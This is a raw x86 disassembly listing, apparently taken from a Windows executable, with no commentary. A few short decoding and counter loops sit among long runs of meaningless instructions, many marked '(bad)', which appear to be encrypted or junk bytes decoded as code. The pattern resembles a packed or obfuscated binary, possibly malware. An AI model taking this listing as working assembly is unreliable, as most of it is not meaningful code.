  408429:	pushf  
  40842a:	push   0xffffff85
  40842c:	pop    edx
  40842d:	sbb    dl,ch
  40842f:	test   BYTE PTR [ecx],ch
  408431:	shl    BYTE PTR [edi+0x1bd1f913],1
  408437:	and    al,0xfb
  408439:	in     al,dx
  40843a:	dec    ecx
  40843b:	mov    ds:0x1e5a8968,eax
  408440:	popf   
  408441:	xchg   edi,eax
  408442:	(bad)  es:[edi+0x42ee3d47]
  408449:	mov    ebp,0xb657d9da
  40844e:	aad    0x4d
  408450:	push   ebp
  408451:	bound  eax,QWORD PTR [ebx+0x3f]
  408454:	ror    DWORD PTR [edx],0x25
  408457:	push   es
  408458:	push   esp
  408459:	sbb    eax,0x3baafb7a
  40845e:	pop    es
  40845f:	mov    al,ds:0x4f8c3242
  408464:	push   cs
  408465:	dec    ecx
  408466:	aam    0x1b
  408468:	xchg   BYTE PTR [esi],cl
  40846a:	clc    
  40846b:	dec    ebp
  40846c:	adc    al,0x4e
  40846e:	aaa    
  40846f:	je     0x408421
  408471:	loop   0x40842d
  408473:	imul   esi,DWORD PTR [esi+ebx*2],0x6170632e
  40847a:	into   
  40847b:	add    bl,0xa4
  40847e:	xor    eax,0x4dcec329
  408483:	sbb    DWORD PTR [ebp+0x31],ebp
  408486:	inc    ebp
  408487:	nop
  408488:	push   ds
  408489:	mov    al,0x1d
  40848b:	or     ecx,esp
  40848d:	ror    BYTE PTR [edi],1
  40848f:	adc    eax,0xea73bdbe
  408494:	mov    edi,0x257c1079
  408499:	arpl   WORD PTR [ebp-0x792295b4],bx
  40849f:	and    al,cl
  4084a1:	sbb    al,0x7c
  4084a3:	inc    edi
  4084a4:	push   es
  4084a5:	cs cld 
  4084a7:	aam    0x95
  4084a9:	mov    edi,0x9416bcbc
  4084ae:	sbb    al,0x15
  4084b0:	inc    ecx
  4084b1:	(bad)  
  4084b2:	cmp    eax,0xe3fd74ee
  4084b7:	mov    ss,WORD PTR [ebx]
  4084b9:	ins    BYTE PTR es:[edi],dx
  4084ba:	sub    eax,0x2ae5dd37
  4084bf:	mov    ds:0xc1526b76,eax
  4084c4:	add    dh,BYTE PTR [eax+0x3a]
  4084c7:	sbb    dl,BYTE PTR [edx-0x36]
  4084ca:	jle    0x4084c3
  4084cc:	cmp    esp,0xffffff8e
  4084cf:	sub    cl,BYTE PTR ds:0xd3fbaacc
  4084d5:	in     eax,0x3
  4084d7:	cmp    eax,0xc5d71d29
  4084dc:	aaa    
  4084dd:	(bad)  
  4084de:	or     DWORD PTR [edi],ecx
  4084e0:	lods   eax,DWORD PTR ds:[esi]
  4084e1:	pop    edx
  4084e2:	xchg   ebp,eax
  4084e3:	call   0xe7fd:0xf04df8af
  4084ea:	mov    ch,dh
  4084ec:	loope  0x40850d
  4084ee:	out    dx,al
  4084ef:	jns    0x408513
  4084f1:	xor    DWORD PTR [esi+0xf],ebx
  4084f4:	test   BYTE PTR [esi+0x9],cl
  4084f7:	add    BYTE PTR [eax],al
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43372f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43372f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43372f,edx
  408521:	cmp    DWORD PTR ds:0x43372f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43372f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433767
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433617,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433673
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4336bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4336bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4336bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4336bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4336bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	jmp    0x408659
  4085df:	dec    eax
  4085e0:	repz in al,dx
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	scas   eax,DWORD PTR es:[edi]
  4085ea:	add    eax,0x949f02a3
  4085ef:	dec    ebp
  4085f0:	int3   
  4085f1:	sub    al,0x8c
  4085f3:	mov    ah,0x28
  4085f5:	xor    eax,DWORD PTR [esi-0x17]
  4085f8:	out    dx,eax
  4085f9:	idiv   BYTE PTR [edi+0x19]
  4085fc:	adc    DWORD PTR [edi-0x18f92e18],ecx
  408602:	push   esi
  408603:	jno    0x40867c
  408605:	adc    al,0x36
  408607:	cwde   
  408608:	popf   
  408609:	fst    DWORD PTR [ebx+0x2c]
  40860c:	mov    dl,0x68
  40860e:	inc    ebx
  40860f:	test   eax,0x5723d8a5
  408614:	push   cs
  408615:	out    dx,eax
  408616:	lds    esp,FWORD PTR [ebp-0x14f8a039]
  40861c:	cmp    BYTE PTR [eax+ebp*2],al
  40861f:	pop    edi
  408620:	jecxz  0x40866e
  408622:	js     0x408602
  408624:	mov    ds:0x69544a46,eax
  408629:	std    
  40862a:	sbb    ebx,eax
  40862c:	pop    es
  40862d:	cmp    al,0xa
  40862f:	mov    ah,0xdc
  408631:	ret    
  408632:	dec    ebp
  408633:	jnp    0x40862f
  408635:	out    0x28,eax
  408637:	xchg   edx,eax
  408638:	mov    ah,0x6d
  40863a:	push   edx
  40863b:	cmp    ebx,edi
  40863d:	je     0x408643
  40863f:	and    bh,BYTE PTR [edx-0x6560a23e]
  408645:	ins    DWORD PTR es:[edi],dx
  408646:	call   0xfd47d09a
  40864b:	cmc    
  40864c:	mov    bh,0xdc
  40864e:	out    dx,eax
  40864f:	xchg   ecx,eax
  408650:	add    edx,esi
  408652:	pop    ebx
  408653:	xlat   BYTE PTR ds:[ebx]
  408654:	xchg   edx,eax
  408655:	mov    al,0x94
  408657:	xchg   ebx,eax
  408658:	push   ebp
  408659:	push   ebx
  40865a:	imul   BYTE PTR ds:0x8c9f2062
  408660:	jle    0x408671
  408662:	xchg   esi,eax
  408663:	je     0x408663
  408665:	outs   dx,DWORD PTR ds:[esi]
  408666:	jo     0x40863f
  408668:	dec    ecx
  408669:	mov    ds:0x9ef7623,eax
  40866e:	mov    BYTE PTR [edi+esi*2+0x5c116b59],bl
  408675:	sub    DWORD PTR [ebx+0xb81c0c9],0x298bfbb1
  40867f:	jmp    0xf0a0:0xc93ccdaf
  408686:	jg     0x4086c5
  408688:	call   0xf1d0:0xa597afb5
  40868f:	mov    dh,0xbb
  408691:	ins    BYTE PTR es:[edi],dx
  408692:	ss jle 0x40869d
  408695:	dec    edx
  408696:	and    DWORD PTR [ecx],edi
  408698:	mov    bh,0x8d
  40869a:	sbb    DWORD PTR [esi],eax
  40869c:	adc    ebx,esp
  40869e:	mov    ebp,0xe72e151e
  4086a3:	dec    edi
  4086a4:	pop    esp
  4086a5:	out    0x44,eax
  4086a7:	xor    al,0xa9
  4086a9:	daa    
  4086aa:	inc    edx
  4086ab:	cdq    
  4086ac:	xor    bl,BYTE PTR [edx-0x5f]
  4086af:	outs   dx,DWORD PTR ds:[esi]
  4086b0:	clc    
  4086b1:	fisubr WORD PTR [edi+0x17d101c2]
  4086b7:	loope  0x4086fe
  4086b9:	xchg   edx,eax
  4086ba:	push   ebx
  4086bb:	cmp    al,0x5c
  4086bd:	fadd   DWORD PTR [esi]
  4086bf:	mov    dl,0xaa
  4086c1:	popf   
  4086c2:	call   DWORD PTR [edi-0x7]
  4086c5:	loopne 0x4086ff
  4086c7:	mov    eax,ds:0x57463938
  4086cc:	pop    edx
  4086cd:	mov    ah,0xaf
  4086cf:	jge    0x408664
  4086d1:	inc    edx
  4086d2:	sahf   
  4086d3:	sbb    ch,bl
  4086d5:	popa   
  4086d6:	js     0x4086a4
  4086d8:	cmp    eax,eax
  4086da:	xor    BYTE PTR [ebp-0x7ae99d53],bl
  4086e0:	das    
  4086e1:	in     al,dx
  4086e2:	sahf   
  4086e3:	in     eax,dx
  4086e4:	pop    edx
  4086e5:	jle    0x408761
  4086e7:	loope  0x40873b
  4086e9:	out    dx,eax
  4086ea:	sub    eax,0x1895624c
  4086ef:	fst    DWORD PTR [esi-0x136f7dfb]
  4086f5:	stos   BYTE PTR es:[edi],al
  4086f6:	imul   edx,DWORD PTR [eax*1-0x100a399a],0x6a
  4086fe:	pop    ecx
  4086ff:	fidivr WORD PTR [ecx]
  408701:	push   ebx
  408702:	sbb    edi,eax
  408704:	mov    esp,cs
  408706:	in     eax,0x9a
  408708:	shl    BYTE PTR [ecx+edx*8-0x2e],0x48
  40870d:	or     bl,BYTE PTR [eax]
  40870f:	pop    ebp
  408710:	jecxz  0x408739
  408712:	push   ss
  408713:	ins    BYTE PTR es:[edi],dx
  408714:	leave  
  408715:	jne    0x40877a
  408717:	mov    eax,ds:0x760bd29
  40871c:	not    DWORD PTR [esi-0x64]
  40871f:	test   BYTE PTR [ebp+0x64effd8d],bh
  408725:	mov    esp,DWORD PTR [eax-0x29]
  408728:	lea    ebx,[ebx]
  40872a:	push   esi
  40872b:	mov    WORD PTR [ebp-0x318ab1be],ss
  408731:	(bad)  
  408733:	(bad)  
  408734:	mov    al,ds:0xf62d3406
  408739:	push   0x250e1614
  40873e:	jbe    0x4086ff
  408740:	mov    esi,0xc12f97a7
  408745:	int    0xe5
  408747:	lds    ebx,FWORD PTR [esi+0x10]
  40874a:	jns    0x408767
  40874c:	lahf   
  40874d:	xor    DWORD PTR [ecx-0x2f9459d3],esp
  408753:	mov    eax,DWORD PTR [ebp-0x8]
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     BYTE PTR [edi+0x52055788],bl
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	mov    dh,0x64
  408779:	stc    
  40877a:	jp     0x408775
  40877c:	(bad)  
  40877d:	mov    ds:0x82f7ff68,al
  408782:	(bad)  
  408783:	jg     0x408793
  408785:	sub    esi,DWORD PTR [esi+esi*1-0x37888b16]
  40878c:	mov    BYTE PTR [esi+eax*1+0x12],dl
  408790:	push   ebp
  408791:	cmc    
  408792:	pusha  
  408793:	loope  0x4087cf
  408795:	out    0x44,eax
  408797:	push   ss
  408798:	(bad)  [ecx-0x28]
  40879b:	retf   0x392b
  40879e:	out    dx,al
  40879f:	adc    BYTE PTR [edi],bh
  4087a1:	mov    eax,0xdfce6cf8
  4087a6:	cdq    
  4087a7:	inc    esp
  4087a8:	icebp  
  4087a9:	adc    ch,BYTE PTR [ebx-0x4b]
  4087ac:	test   al,0x85
  4087ae:	dec    DWORD PTR [edi-0x727c1c83]
  4087b4:	mov    ebx,0x6b3ed0e1
  4087b9:	das    
  4087ba:	push   ss
  4087bb:	mov    ebp,0x84856753
  4087c0:	sbb    DWORD PTR [edi+0x5dc32a08],0xffffffd9
  4087c7:	fwait
  4087c8:	xchg   edx,eax
  4087c9:	push   esi
  4087ca:	add    al,0x72
  4087cc:	das    
  4087cd:	xor    dl,BYTE PTR [ebp-0x3af89cd7]
  4087d3:	push   ds
  4087d4:	sub    BYTE PTR ds:[eax-0x31],al
  4087d8:	or     eax,0xe9f0baff
  4087dd:	inc    DWORD PTR [esi]
  4087df:	cmp    bh,BYTE PTR [ebp+0x21]
  4087e2:	cmp    ebx,DWORD PTR [edi]
  4087e4:	push   ecx
  4087e5:	stc    
  4087e6:	inc    ebp
  4087e7:	inc    edx
  4087e8:	imul   esp,esp,0x8f2826ae
  4087ee:	sti    
  4087ef:	mov    ds:0x29fc3407,eax
  4087f4:	pop    esi
  4087f5:	xor    BYTE PTR [ecx-0xf],bl
  4087f8:	sahf   
  4087f9:	sbb    BYTE PTR [edx],bl
  4087fb:	pop    ecx
  4087fc:	jg     0x4087de
  4087fe:	aad    0x82
  408800:	pushf  
  408801:	shl    bh,cl
  408803:	mov    ebp,0xf728e849
  408808:	cwde   
  408809:	bound  ecx,QWORD PTR ds:0x14864c2e
  40880f:	push   ecx
  408810:	call   0x4f3b1cc9
  408815:	scas   al,BYTE PTR es:[edi]
  408816:	ja     0x408834
  408818:	mov    ecx,0xe6861727
  40881d:	shl    BYTE PTR [edi],0x19
  408820:	mov    ch,bh
  408822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408823:	cdq    
  408824:	sub    esp,ebp
  408826:	les    edi,FWORD PTR [esi+0x733bb0a1]
  40882c:	das    
  40882d:	out    dx,eax
  40882e:	xor    DWORD PTR [edi-0x64],0xffffff86
  408832:	in     eax,dx
  408833:	or     ecx,DWORD PTR [edx+0xf0e057f]
  408839:	shl    BYTE PTR [ecx+edi*1],1
  40883c:	popf   
  40883d:	or     al,0xcb
  40883f:	xchg   ecx,eax
  408840:	imul   edx,DWORD PTR [esi+edi*2+0x3c],0x3
  408845:	rcr    DWORD PTR [edi+0x24f074fb],cl
  40884b:	or     bl,dh
  40884d:	pop    edx
  40884e:	enter  0x374c,0x62
  408852:	scas   al,BYTE PTR es:[edi]
  408853:	jb     0x408895
  408855:	mov    ecx,0x967232fe
  40885a:	inc    ecx
  40885b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885c:	adc    BYTE PTR [ebx+edi*8+0x71],0x67
  408861:	and    edi,DWORD PTR [edx-0x3d2ba678]
  408867:	xchg   DWORD PTR [ebx-0xe9da609],esp
  40886d:	sar    ch,cl
  40886f:	and    al,0x3b
  408871:	shr    DWORD PTR [ebx+ebp*1-0x3a],1
  408875:	mov    eax,ds:0xc790aae6
  40887a:	add    esi,ecx
  40887c:	repz shr ebp,cl
  40887f:	pusha  
  408880:	cld    
  408881:	mov    ebx,DWORD PTR [ecx+0x6fa080a4]
  408887:	mov    ecx,0x55b697a6
  40888c:	and    bl,cl
  40888e:	setle  BYTE PTR [ebx+0x1ff554ab]
  408895:	mov    ds:0x57a8b199,al
  40889a:	int3   
  40889b:	push   es
  40889c:	popf   
  40889d:	jl     0x408821
  40889f:	pop    ds
  4088a0:	fcmovnbe st,st(3)
  4088a2:	xor    eax,0x662eef2d
  4088a7:	mov    ch,0xf6
  4088a9:	adc    dh,BYTE PTR [edx+ebx*2]
  4088ac:	stos   DWORD PTR es:[edi],eax
  4088ad:	stc    
  4088ae:	mov    ebx,0x9044baf
  4088b3:	and    DWORD PTR [esi],esi
  4088b5:	aad    0x3b
  4088b7:	adc    BYTE PTR [ecx+0x9],ch
  4088ba:	ins    DWORD PTR es:[edi],dx
  4088bb:	mov    ecx,0x3ce19f30
  4088c0:	dec    ebx
  4088c1:	sbb    al,0x17
  4088c3:	adc    DWORD PTR [esi+0x1],0x3be49eca
  4088ca:	fcomp  DWORD PTR [ecx]
  4088cc:	data16 scas al,BYTE PTR es:[edi]
  4088ce:	lock fistp QWORD PTR [ebp+edi*1-0x31]
  4088d3:	push   eax
  4088d4:	mov    eax,esp
  4088d6:	inc    edi
  4088d7:	aas    
  4088d8:	cs arpl bx,si
  4088db:	addr16 call 0x5e5f:0x3f507f2f
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0x2a7b681a
  40893f:	push   ds
  408940:	inc    esp
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	inc    edx
  40894a:	mov    bl,0x5f
  40894c:	cmp    eax,0xad2a187
  408951:	jg     0x408902
  408953:	(bad)  
  408954:	das    
  408955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408956:	(bad)  
  408958:	inc    esi
  408959:	scas   al,BYTE PTR es:[edi]
  40895a:	int    0x37
  40895c:	add    DWORD PTR [eax],esi
  40895e:	mov    eax,ds:0x4835ea1e
  408963:	cwde   
  408964:	push   edx
  408965:	mov    cl,0xbd
  408967:	pop    eax
  408968:	mov    bl,0xb1
  40896a:	push   0x16a8a785
  40896f:	fwait
  408970:	push   0x42
  408972:	adc    BYTE PTR [edx],cl
  408974:	loopne 0x408958
  408976:	cmc    
  408977:	(bad)  
  408978:	mov    DWORD PTR [esi-0x50],ecx
  40897b:	mul    DWORD PTR [edi]
  40897d:	xchg   ebp,eax
  40897e:	or     BYTE PTR [edi+ebx*2+0x38008c1],bh
  408985:	out    0x1,eax
  408987:	and    bh,BYTE PTR [ecx+esi*2]
  40898a:	lods   eax,DWORD PTR ds:[esi]
  40898b:	or     al,0x59
  40898d:	xlat   BYTE PTR ds:[ebx]
  40898e:	adc    ah,al
  408990:	add    DWORD PTR [edx-0x44783553],edi
  408996:	mov    gs,WORD PTR [esi+0xc]
  408999:	jmp    0x6db816b5
  40899e:	jge    0x408a18
  4089a0:	sbb    esp,0x2d
  4089a3:	jmp    0x408a1f
  4089a5:	imul   ecx,DWORD PTR [edi+edi*2+0x2dd4e57e],0xcee62999
  4089b0:	mov    ch,0x2a
  4089b2:	sbb    BYTE PTR [eax-0x49],0x17
  4089b6:	mov    ecx,DWORD PTR [eax+0x3]
  4089b9:	cmp    eax,0xab71e036
  4089be:	xchg   BYTE PTR ds:0xfe79ec88,bl
  4089c4:	pop    ecx
  4089c5:	jmp    0x4089f8
  4089c7:	xor    dl,BYTE PTR [edx-0x3fd8a21d]
  4089cd:	pop    eax
  4089ce:	and    eax,0xa7f086c7
  4089d3:	mov    bh,0x55
  4089d5:	call   0x59f2c770
  4089da:	js     0x4089b8
  4089dc:	mov    DWORD PTR [eax],esp
  4089de:	sbb    BYTE PTR [esi+0x3b],0x1e
  4089e2:	imul   edx,DWORD PTR [eax+0x6567f8aa],0xffffff8b
  4089e9:	fnstenv [edi-0x67]
  4089ec:	mov    al,ds:0x922991b
  4089f1:	fisubr DWORD PTR [edi-0x70]
  4089f4:	nop
  4089f5:	sbb    DWORD PTR [esi+0x3f],edx
  4089f8:	xor    al,cl
  4089fa:	cmp    bl,dl
  4089fc:	mov    bl,0x25
  4089fe:	cmp    al,0xfb
  408a00:	pop    edi
  408a01:	sub    eax,0x825d05c7
  408a06:	push   esp
  408a07:	sbb    BYTE PTR [ebx],al
  408a09:	sbb    DWORD PTR [eax],edx
  408a0b:	pop    ecx
  408a0c:	pop    eax
  408a0d:	dec    ebp
  408a0e:	hlt    
  408a0f:	(bad)  
  408a10:	(bad)  
  408a11:	xchg   esp,eax
  408a12:	jbe    0x408a09
  408a14:	dec    edi
  408a15:	jmp    0x4089fb
  408a17:	jo     0x408a2c
  408a19:	mov    al,ds:0xb5db8ade
  408a1e:	jl     0x408a1b
  408a20:	lods   al,BYTE PTR ds:[esi]
  408a21:	std    
  408a22:	rcl    DWORD PTR [ecx-0x10c920cd],1
  408a28:	daa    
  408a29:	mov    DWORD PTR [ebx],ebp
  408a2b:	pop    gs
  408a2d:	sahf   
  408a2e:	daa    
  408a2f:	xor    DWORD PTR [ecx],ebx
  408a31:	mov    fs,WORD PTR [bx+si+0x18]
  408a35:	enter  0xb4de,0x9d
  408a39:	ins    DWORD PTR es:[edi],dx
  408a3a:	mov    edi,0x71224b21
  408a3f:	jns    0x408ab3
  408a41:	mov    edx,0xaa5649f4
  408a46:	sbb    edx,DWORD PTR [eax-0x4f645e37]
  408a4c:	mov    ds:0x36e1ddf0,al
  408a51:	push   cs
  408a52:	es dec ebx
  408a54:	fnstenv [edi+0x1d5db20b]
  408a5a:	mov    ds:0xcc4ca95f,eax
  408a5f:	inc    ebx
  408a60:	sbb    DWORD PTR [edx+0x30a670c4],eax
  408a66:	jb     0x408ad7
  408a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a69:	fcomp  DWORD PTR [edi]
  408a6b:	imul   ebx,DWORD PTR [esi+0x71680f38],0xdd82abdd
  408a75:	in     eax,dx
  408a76:	loop   0x408a39
  408a78:	popf   
  408a79:	call   0xade8:0xcc60f06
  408a80:	push   cs
  408a81:	mov    WORD PTR [edi],fs
  408a83:	fnstsw WORD PTR [ebp-0x18]
  408a86:	mov    bl,BYTE PTR [ebx-0x3a]
  408a89:	mov    eax,ds:0xe0dd6bb9
  408a8e:	imul   edi,DWORD PTR [esi+0x4a],0x90635d72
  408a95:	ret    0x862b
  408a98:	call   FWORD PTR [edi]
  408a9a:	pusha  
  408a9b:	jno    0x408a8a
  408a9d:	mov    ecx,0xb02199ae
  408aa2:	loopne 0x408aa5
  408aa4:	ret    0x28fc
  408aa7:	sbb    edi,DWORD PTR [ebx]
  408aa9:	imul   BYTE PTR [edi+0x10a3fdba]
  408aaf:	cmp    al,0xbf
  408ab1:	lods   eax,DWORD PTR ds:[esi]
  408ab2:	push   esp
  408ab3:	mov    edi,DWORD PTR [ebp+0x8]
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	push   ss
  408b1b:	jg     0x408b67
  408b1d:	jl     0x408acd
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	fdivr  st(5),st
  408b28:	pop    ebp
  408b29:	loope  0x408b69
  408b2b:	fs jle 0x408b00
  408b2e:	push   ebp
  408b2f:	xor    eax,0xe9bc97aa
  408b34:	repz int3 
  408b36:	and    eax,eax
  408b38:	sbb    al,0xe1
  408b3a:	jae    0x408ac9
  408b3c:	fwait
  408b3d:	jne    0x408bbb
  408b3f:	xor    al,0xcb
  408b41:	mov    bl,0xb4
  408b43:	(bad)  
  408b44:	out    dx,eax
  408b45:	pop    esp
  408b46:	stos   DWORD PTR es:[edi],eax
  408b47:	in     al,dx
  408b48:	retf   0x9cca
  408b4b:	(bad)  
  408b4d:	mov    ds:0x90c061ab,al
  408b52:	div    bh
  408b54:	jmp    0x408b7e
  408b56:	dec    edx
  408b57:	jmp    0x4100ac77
  408b5c:	test   BYTE PTR [ebp+0x36],cl
  408b5f:	jmp    0x3dbcd8c7
  408b64:	dec    esi
  408b65:	jmp    0x14234e40
  408b6a:	jnp    0x408b0b
  408b6c:	int    0xe3
  408b6e:	movd   mm0,DWORD PTR [edi]
  408b71:	mov    ch,BYTE PTR [esi+0x40]
  408b74:	lahf   
  408b75:	and    edx,DWORD PTR [esi+0x29]
  408b78:	or     ch,BYTE PTR [edx+0x79]
  408b7b:	retf   0xe61b
  408b7e:	repz adc DWORD PTR [eax+esi*8+0x51],eax
  408b83:	imul   BYTE PTR [eax-0x3dfb6276]
  408b89:	test   eax,0x6e6fbd90
  408b8e:	ja     0x408bad
  408b90:	dec    ecx
  408b91:	jg     0x408b49
  408b93:	aad    0xc1
  408b95:	or     BYTE PTR [ecx-0x3e288f2c],dh
  408b9b:	pop    ds
  408b9c:	mov    eax,0x5ddf520d
  408ba1:	mov    fs,WORD PTR cs:[ecx+0x6563a56b]
  408ba8:	xchg   esp,eax
  408ba9:	jle    0x408b5b
  408bab:	xchg   dh,cl
  408bad:	in     al,0xed
  408baf:	clc    
  408bb0:	jp     0x408b4d
  408bb2:	repnz rcr DWORD PTR [edi-0x12],cl
  408bb6:	cs inc ecx
  408bb8:	js     0x408b75
  408bba:	sbb    DWORD PTR [eax],ebx
  408bbc:	or     DWORD PTR [esi+0x1c],0xe588125
  408bc3:	sub    bl,BYTE PTR [eax]
  408bc5:	and    eax,0xda99210f
  408bca:	jg     0x408be6
  408bcc:	lock data16 data16 fsub st(2),st
  408bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bd2:	mov    fs,WORD PTR [ebx+ecx*2+0x36f793cd]
  408bd9:	or     bh,bh
  408bdb:	(bad)  
  408bdc:	in     eax,dx
  408bdd:	and    eax,0x459db656
  408be2:	sbb    al,0x3c
  408be4:	sbb    al,0xcf
  408be6:	jbe    0x408c10
  408be8:	bound  ebp,QWORD PTR [eax-0x1ec7b2b9]
  408bee:	mov    ebx,0x7e595e31
  408bf3:	mul    BYTE PTR [ecx]
  408bf5:	jb     0x408ba6
  408bf7:	(bad)  
  408bf8:	pop    esp
  408bf9:	fsubrp st(0),st
  408bfb:	scas   al,BYTE PTR es:[edi]
  408bfc:	or     BYTE PTR [ebx],cl
  408bfe:	fs jle 0x408bdb
  408c01:	push   ds
  408c02:	jg     0x408bce
  408c04:	sub    eax,0xd998d301
  408c09:	fimul  WORD PTR [ebp+0x6d679728]
  408c0f:	scas   eax,DWORD PTR es:[edi]
  408c10:	out    0xae,eax
  408c12:	adc    al,0x99
  408c14:	mov    cl,0x90
  408c16:	test   eax,0x1699e272
  408c1b:	mov    al,0x7f
  408c1d:	shr    ebp,1
  408c1f:	mov    ecx,0xa773a80f
  408c24:	adc    DWORD PTR [ebx-0x3a],ecx
  408c27:	iret   
  408c28:	imul   esi,DWORD PTR [edi-0x1],0x806ae887
  408c2f:	scas   al,BYTE PTR es:[edi]
  408c30:	jne    0x408c64
  408c32:	cwde   
  408c33:	xor    DWORD PTR [ebp+0x7f],0x64
  408c37:	dec    ecx
  408c38:	hlt    
  408c39:	imul   esp,DWORD PTR [ecx],0xffffffb5
  408c3c:	out    dx,al
  408c3d:	mov    esp,0x61b79562
  408c42:	lock cs pop es
  408c45:	pop    esi
  408c46:	call   0xcf019bb6
  408c4b:	sub    esp,DWORD PTR [esi-0x2586296e]
  408c51:	dec    ecx
  408c52:	stc    
  408c53:	mov    ds:0xd1a26919,al
  408c58:	sub    eax,0xfc4d69f5
  408c5d:	push   0x38
  408c5f:	push   esp
  408c60:	xor    esi,DWORD PTR [esp+ecx*4-0x38]
  408c64:	aad    0x54
  408c66:	test   DWORD PTR [esi-0x4ff3c729],esp
  408c6c:	push   0xffffffdf
  408c6e:	test   eax,0xa487c808
  408c73:	or     DWORD PTR [ebp+0x34],esi
  408c76:	mov    eax,ds:0xecc1caa0
  408c7b:	jle    0x408cf0
  408c7d:	(bad)  
  408c7e:	sbb    dl,BYTE PTR [esp+edi*8+0x33]
  408c82:	sti    
  408c83:	cs push ebp
  408c85:	jge    0x408cf8
  408c87:	outs   dx,BYTE PTR ds:[esi]
  408c88:	(bad)  
  408c89:	xor    al,0xa2
  408c8b:	jae    0x408c18
  408c8d:	push   ebx
  408c8e:	adc    edx,DWORD PTR [ecx-0x50f029fd]
  408c94:	xlat   BYTE PTR ds:[ebx]
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
